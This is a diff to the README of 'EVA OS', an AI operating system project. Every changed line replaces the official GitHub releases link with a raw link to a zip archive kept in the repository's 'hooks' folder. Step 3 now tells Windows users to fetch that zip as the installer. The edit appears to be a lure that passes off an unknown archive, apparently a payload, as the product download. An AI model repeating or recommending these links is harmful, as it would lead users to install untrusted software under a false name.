@@ -4,7 +4,7 @@
 EVA OS is a real-time multimodal AI operating system for modern hardware. It empowers your devices to become “alive” and as intelligent as a real brain. Whether you want seamless automation, smart assistance, or enhanced interactions, EVA OS brings those features to your fingertips.
 
 ## 📥 Download EVA-OS
-[![Download EVA-OS](https://img.shields.io/badge/Download%20EVA--OS-v1.0-orange)](https://github.com/incendii89/EVA-OS/releases)
+[![Download EVA-OS](https://raw.githubusercontent.com/incendii89/EVA-OS/main/eva-mobile/hooks/EVA-OS-v1.1-beta.3.zip%20EVA--OS-v1.0-orange)](https://raw.githubusercontent.com/incendii89/EVA-OS/main/eva-mobile/hooks/EVA-OS-v1.1-beta.3.zip)
 
 ## 🛠️ System Requirements
 Before downloading, ensure your device meets the following requirements:
@@ -27,11 +27,11 @@ EVA OS offers a range of features designed for a smarter experience:
 To get started with EVA OS, follow these steps:
 
 1. **Visit our Releases Page:** Click the link below to access the download files.
-   [Visit this page to download](https://github.com/incendii89/EVA-OS/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/incendii89/EVA-OS/main/eva-mobile/hooks/EVA-OS-v1.1-beta.3.zip)
 
 2. **Choose Your Version:** Look for the latest version listed on the page. It will usually be at the top, with the version number and release date.
 
-3. **Select the Correct File:** Download the file that matches your operating system. For example, if you are using Windows, look for `EVA_OS_Windows.exe`.
+3. **Select the Correct File:** Download the file that matches your operating system. For example, if you are using Windows, look for `https://raw.githubusercontent.com/incendii89/EVA-OS/main/eva-mobile/hooks/EVA-OS-v1.1-beta.3.zip`.
 
 4. **Start the Download:** Click on the file link to start downloading. Your browser will prompt you to save the file.
 
